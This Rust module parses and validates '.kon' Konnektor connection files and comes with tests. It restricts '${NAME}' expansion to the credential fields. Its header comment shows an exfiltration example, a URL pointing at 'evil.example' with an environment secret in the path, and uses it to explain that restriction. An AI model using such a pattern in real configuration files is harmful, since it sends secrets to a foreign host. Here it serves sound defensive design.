//! The `.kon` file: how to reach a Konnektor and whom to act as, shared with the Go
//! and Kotlin clients.
//!
//! `${NAME}` is expanded in `credentials.username`, `credentials.password` and
//! `credentials.data` only. A `.kon` file may come from someone else, and expanding
//! everywhere (as the Go client does) lets `"url": "https://evil.example/${SECRET}"`
//! send any environment variable to a foreign host. So:
//! - `${…}` anywhere else is an error, not a literal;
//! - only `${NAME}` with `NAME` matching `[A-Za-z_][A-Za-z0-9_]*`: no `$NAME`, defaults,
//!   nesting or other shell syntax; a `$` not followed by `{` is literal;
//! - expansion runs on parsed strings, never on the raw JSON, so a value cannot inject
//!   JSON, and expanded values are not scanned again;
//! - an unset variable is an error, not an empty string.

use core::fmt::{self, Write as _};

use base64::Engine as _;
use serde::Deserialize;
use serde_json::Value;
use ti_types::Env;

/// A parsed and validated `.kon` file.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Dotkon {
    /// Format version, informational.
    pub version: Option<String>,
    /// Base URL of the Konnektor; the service directory is `connector.sds` below it.
    pub url: String,
    /// Replace scheme and host of every endpoint in the service directory with those of
    /// `url`, for Konnektors behind NAT or a port forward.
    pub rewrite_service_endpoints: bool,
    /// Call context: Mandant.
    pub mandant_id: String,
    /// Call context: workplace.
    pub workplace_id: String,
    /// Call context: client system.
    pub client_system_id: String,
    /// Call context: user, needed by some operations (e.g. with an HBA).
    pub user_id: Option<String>,
    /// How the client authenticates.
    pub credentials: Credentials,
    /// The TI environment the Konnektor is connected to, if stated.
    pub env: Option<Env>,
    /// Skip TLS server verification. Only for test Konnektors.
    pub insecure_skip_verify: bool,
    /// The name the Konnektor's TLS certificate must carry (and the SNI sent), when it
    /// differs from the host in `url`.
    pub expected_host: Option<String>,
    /// DER certificates to trust for the Konnektor's TLS: CA certificates as anchors,
    /// end-entity certificates as pins.
    pub trust_store: Vec<Vec<u8>>,
    /// Names of the environment variables that were expanded, sorted, for diagnostics;
    /// never their values.
    pub variables: Vec<String>,
}

/// Client authentication at the Konnektor.
#[derive(Clone, PartialEq, Eq)]
pub enum Credentials {
    /// HTTP basic authentication.
    Basic {
        /// User name.
        username: String,
        /// Password.
        password: String,
    },
    /// Mutual TLS with the certificate and key of a PKCS#12 file.
    Pkcs12 {
        /// The PKCS#12 bytes.
        data: Vec<u8>,
        /// Its password.
        password: String,
    },
}

impl fmt::Debug for Credentials {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Credentials::Basic { username, .. } => f
                .debug_struct("Basic")
                .field("username", username)
                .finish_non_exhaustive(),
            Credentials::Pkcs12 { data, .. } => f
                .debug_struct("Pkcs12")
                .field("bytes", &data.len())
                .finish_non_exhaustive(),
        }
    }
}

/// Everything wrong with a `.kon` file, collected rather than one at a time.
#[derive(Clone, Debug, PartialEq, Eq, thiserror::Error)]
#[error("invalid .kon configuration:\n  - {}", .problems.join("\n  - "))]
pub struct DotkonError {
    /// One line per problem.
    pub problems: Vec<String>,
}

/// The file as written; every field optional so that validation can report all gaps.
#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct Raw {
    version: Option<String>,
    url: Option<String>,
    #[serde(default)]
    rewrite_service_endpoints: bool,
    mandant_id: Option<String>,
    workplace_id: Option<String>,
    client_system_id: Option<String>,
    user_id: Option<String>,
    credentials: Option<RawCredentials>,
    env: Option<String>,
    #[serde(default)]
    insecure_skip_verify: bool,
    expected_host: Option<String>,
    #[serde(default)]
    trust_store: Vec<String>,
}

#[derive(Deserialize)]
struct RawCredentials {
    #[serde(rename = "type")]
    kind: Option<String>,
    username: Option<String>,
    password: Option<String>,
    data: Option<String>,
}

/// The JSON paths where `${NAME}` is expanded.
const EXPANDED: [&str; 3] = [
    "credentials.username",
    "credentials.password",
    "credentials.data",
];

impl Dotkon {
    /// Parses a `.kon` file, expanding `${NAME}` from the process environment.
    ///
    /// # Errors
    ///
    /// [`DotkonError`] listing every problem found.
    pub fn parse(json: &[u8]) -> Result<Self, DotkonError> {
        Self::parse_with(json, |name| std::env::var(name).ok())
    }

    /// Parses a `.kon` file, expanding `${NAME}` through `lookup`.
    ///
    /// # Errors
    ///
    /// [`DotkonError`] listing every problem found.
    pub fn parse_with(
        json: &[u8],
        lookup: impl Fn(&str) -> Option<String>,
    ) -> Result<Self, DotkonError> {
        let mut value: Value = serde_json::from_slice(json).map_err(|e| DotkonError {
            problems: vec![format!("not JSON: {e}")],
        })?;
        let mut problems = Vec::new();
        let mut variables = Vec::new();
        visit(&mut value, &mut String::new(), &mut |path, text| {
            if EXPANDED.contains(&path) {
                match expand(text, &lookup, &mut variables) {
                    Ok(expanded) => *text = expanded,
                    Err(problem) => problems.push(format!("\"{path}\": {problem}")),
                }
            } else if text.contains("${") {
                problems.push(format!(
                    "\"{path}\": ${{…}} is expanded only in credentials.username, \
                     credentials.password and credentials.data"
                ));
            }
        });
        variables.sort();
        let raw: Raw = serde_json::from_value(value).map_err(|e| DotkonError {
            problems: vec![format!("unexpected structure: {e}")],
        })?;
        let dotkon = validate(raw, &mut problems, variables);
        match dotkon {
            Some(dotkon) if problems.is_empty() => Ok(dotkon),
            _ => Err(DotkonError { problems }),
        }
    }

    /// The HTTP `Authorization` header value for basic credentials.
    pub fn authorization(&self) -> Option<String> {
        match &self.credentials {
            Credentials::Basic { username, password } => Some(format!(
                "Basic {}",
                base64::engine::general_purpose::STANDARD.encode(format!("{username}:{password}"))
            )),
            Credentials::Pkcs12 { .. } => None,
        }
    }
}

/// Calls `f` with the dotted path and a mutable reference of every string in `value`.
fn visit(value: &mut Value, path: &mut String, f: &mut impl FnMut(&str, &mut String)) {
    match value {
        Value::String(text) => f(path, text),
        Value::Array(items) => {
            for (i, item) in items.iter_mut().enumerate() {
                let len = path.len();
                write!(path, "[{i}]").expect("writing to a String cannot fail");
                visit(item, path, f);
                path.truncate(len);
            }
        }
        Value::Object(fields) => {
            for (key, item) in fields.iter_mut() {
                let len = path.len();
                if !path.is_empty() {
                    path.push('.');
                }
                path.push_str(key);
                visit(item, path, f);
                path.truncate(len);
            }
        }
        Value::Null | Value::Bool(_) | Value::Number(_) => {}
    }
}

/// Replaces each `${NAME}` in `text` with `lookup(NAME)`, in one pass.
fn expand(
    text: &str,
    lookup: &impl Fn(&str) -> Option<String>,
    used: &mut Vec<String>,
) -> Result<String, String> {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(start) = rest.find("${") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let end = after
            .find('}')
            .ok_or_else(|| "unterminated ${".to_owned())?;
        let name = &after[..end];
        let mut chars = name.chars();
        let valid = chars
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
            && chars.all(|c| c.is_ascii_alphanumeric() || c == '_');
        if !valid {
            return Err(format!(
                "${{{name}}} is not a variable name ([A-Za-z_][A-Za-z0-9_]*)"
            ));
        }
        out.push_str(
            &lookup(name).ok_or_else(|| format!("environment variable {name} is not set"))?,
        );
        if !used.iter().any(|n| n == name) {
            used.push(name.to_owned());
        }
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    Ok(out)
}

fn validate(raw: Raw, problems: &mut Vec<String>, variables: Vec<String>) -> Option<Dotkon> {
    let mut required = |value: Option<String>, name: &str| {
        let value = value.filter(|v| !v.is_empty());
        if value.is_none() {
            problems.push(format!("\"{name}\" is required"));
        }
        value.unwrap_or_default()
    };
    let url = required(raw.url, "url");
    let mandant_id = required(raw.mandant_id, "mandantId");
    let workplace_id = required(raw.workplace_id, "workplaceId");
    let client_system_id = required(raw.client_system_id, "clientSystemId");
    if !url.is_empty() && crate::sds::split_origin(&url).is_none() {
        problems.push(format!(
            "\"url\" must be an http or https URL with a host (got {url:?})"
        ));
    }
    let env = raw.env.filter(|e| !e.is_empty()).and_then(|e| {
        let env = e.parse().ok();
        if env.is_none() {
            problems.push(format!("\"env\" must be one of ru, tu, pu (got {e:?})"));
        }
        env
    });
    let credentials = match raw.credentials {
        None => {
            problems.push("\"credentials\" is required".into());
            None
        }
        Some(c) => credentials(c, problems),
    };
    let mut trust_store = Vec::new();
    for (i, text) in raw.trust_store.iter().enumerate() {
        match decode_base64(text) {
            Some(der) if der.first() == Some(&0x30) => trust_store.push(der),
            _ => problems.push(format!(
                "\"trustStore[{i}]\" is not a base64 DER certificate"
            )),
        }
    }
    Some(Dotkon {
        version: raw.version,
        url,
        rewrite_service_endpoints: raw.rewrite_service_endpoints,
        mandant_id,
        workplace_id,
        client_system_id,
        user_id: raw.user_id.filter(|u| !u.is_empty()),
        credentials: credentials?,
        env,
        insecure_skip_verify: raw.insecure_skip_verify,
        expected_host: raw.expected_host.filter(|h| !h.is_empty()),
        trust_store,
        variables,
    })
}

fn credentials(raw: RawCredentials, problems: &mut Vec<String>) -> Option<Credentials> {
    let mut required = |value: Option<String>, name: &str, kind: &str| {
        let value = value.filter(|v| !v.is_empty());
        if value.is_none() {
            problems.push(format!(
                "\"credentials.{name}\" is required for {kind} credentials"
            ));
        }
        value
    };
    match raw.kind.as_deref() {
        Some("basic") => {
            let username = required(raw.username, "username", "basic");
            let password = required(raw.password, "password", "basic");
            Some(Credentials::Basic {
                username: username?,
                password: password?,
            })
        }
        Some("pkcs12") => {
            let data = required(raw.data, "data", "pkcs12")?;
            let Some(data) = decode_base64(&data) else {
                problems.push("\"credentials.data\" is not base64".into());
                return None;
            };
            Some(Credentials::Pkcs12 {
                data,
                password: raw.password.unwrap_or_default(),
            })
        }
        None | Some("") => {
            problems.push("\"credentials.type\" is required".into());
            None
        }
        Some(other) => {
            problems.push(format!(
                "unsupported \"credentials.type\": {other:?} (must be basic or pkcs12)"
            ));
            None
        }
    }
}

/// Standard base64, ignoring line breaks and other whitespace (MIME-style wrapping).
fn decode_base64(text: &str) -> Option<Vec<u8>> {
    let compact: String = text.chars().filter(|c| !c.is_ascii_whitespace()).collect();
    base64::engine::general_purpose::STANDARD
        .decode(compact)
        .ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn env(name: &str) -> Option<String> {
        match name {
            "KON_PASSWORD" => Some("s3cr\"et${OTHER}".into()),
            "KON_USER" => Some("user".into()),
            "OTHER" => Some("never".into()),
            _ => None,
        }
    }

    fn parse(json: &str) -> Result<Dotkon, DotkonError> {
        Dotkon::parse_with(json.as_bytes(), env)
    }

    const BASIC: &str = r#"{
        "version": "1.0.0",
        "url": "https://konnektor.example.com:8443",
        "mandantId": "M1", "workplaceId": "W1", "clientSystemId": "C1", "userId": "U1",
        "credentials": {"type": "basic", "username": "${KON_USER}", "password": "${KON_PASSWORD}"},
        "env": "ru", "insecureSkipVerify": true, "expectedHost": "konnektor.example.com"
    }"#;

    #[test]
    fn parses_like_go() {
        let kon = parse(BASIC).unwrap();
        assert_eq!(kon.url, "https://konnektor.example.com:8443");
        assert_eq!(
            (&*kon.mandant_id, &*kon.workplace_id, &*kon.client_system_id),
            ("M1", "W1", "C1")
        );
        assert_eq!(kon.user_id.as_deref(), Some("U1"));
        assert_eq!(kon.env, Some(Env::Ref));
        assert!(kon.insecure_skip_verify);
        assert_eq!(kon.expected_host.as_deref(), Some("konnektor.example.com"));
        assert_eq!(kon.variables, ["KON_PASSWORD", "KON_USER"]);
    }

    #[test]
    fn expanded_values_are_neither_json_nor_expanded_again() {
        let kon = parse(BASIC).unwrap();
        assert_eq!(
            kon.credentials,
            Credentials::Basic {
                username: "user".into(),
                password: "s3cr\"et${OTHER}".into(),
            }
        );
        assert!(
            !format!("{kon:?}").contains("s3cr"),
            "Debug hides the password"
        );
    }

    #[test]
    fn variables_outside_credentials_are_refused() {
        for field in ["url", "expectedHost", "mandantId", "env"] {
            let json = BASIC.replacen(
                &format!("\"{field}\": \""),
                &format!("\"{field}\": \"${{KON_PASSWORD}}"),
                1,
            );
            let err = parse(&json).unwrap_err();
            assert!(
                err.problems
                    .iter()
                    .any(|p| p.starts_with(&format!("\"{field}\": ${{…}} is expanded only"))),
                "{field}: {err}"
            );
        }
        let err =
            parse(&BASIC.replace("\"version\": \"1.0.0\"", "\"x\": [\"${OTHER}\"]")).unwrap_err();
        assert!(err.problems[0].starts_with("\"x[0]\""), "{err}");
    }

    #[test]
    fn only_plain_variable_names() {
        for (password, problem) in [
            ("${KON_PASSWORD:-x}", "is not a variable name"),
            ("${1ABC}", "is not a variable name"),
            ("${}", "is not a variable name"),
            ("${KON_${OTHER}}", "is not a variable name"),
            ("${KON_PASSWORD", "unterminated"),
            ("${UNSET}", "UNSET is not set"),
        ] {
            let err = parse(&BASIC.replace("${KON_PASSWORD}", password)).unwrap_err();
            assert!(err.problems[0].contains(problem), "{password}: {err}");
        }
        let kon = parse(&BASIC.replace("${KON_PASSWORD}", "$HOME pa$$")).unwrap();
        assert!(
            matches!(kon.credentials, Credentials::Basic { password, .. } if password == "$HOME pa$$")
        );
    }

    #[test]
    fn collects_every_problem() {
        let err = parse(r#"{"env": "xx", "trustStore": ["!!"]}"#).unwrap_err();
        assert_eq!(
            err.problems,
            [
                "\"url\" is required",
                "\"mandantId\" is required",
                "\"workplaceId\" is required",
                "\"clientSystemId\" is required",
                "\"env\" must be one of ru, tu, pu (got \"xx\")",
                "\"credentials\" is required",
                "\"trustStore[0]\" is not a base64 DER certificate",
            ]
        );
        let err = parse(&BASIC.replace("https://konnektor.example.com:8443", "ftp:x")).unwrap_err();
        assert!(err.problems[0].starts_with("\"url\" must be"), "{err}");
    }

    #[test]
    fn pkcs12_data_is_decoded_mime_tolerant() {
        let json = BASIC.replace(
            r#"{"type": "basic", "username": "${KON_USER}", "password": "${KON_PASSWORD}"}"#,
            r#"{"type": "pkcs12", "data": "MIIB\nAAA=", "password": "00"}"#,
        );
        let kon = parse(&json).unwrap();
        assert_eq!(
            kon.credentials,
            Credentials::Pkcs12 {
                data: vec![0x30, 0x82, 0x01, 0, 0],
                password: "00".into()
            }
        );
        assert_eq!(kon.authorization(), None);
    }

    #[test]
    fn basic_authorization_header() {
        let kon = parse(&BASIC.replace("${KON_PASSWORD}", "pw")).unwrap();
        assert_eq!(kon.authorization().unwrap(), "Basic dXNlcjpwdw==");
    }
}
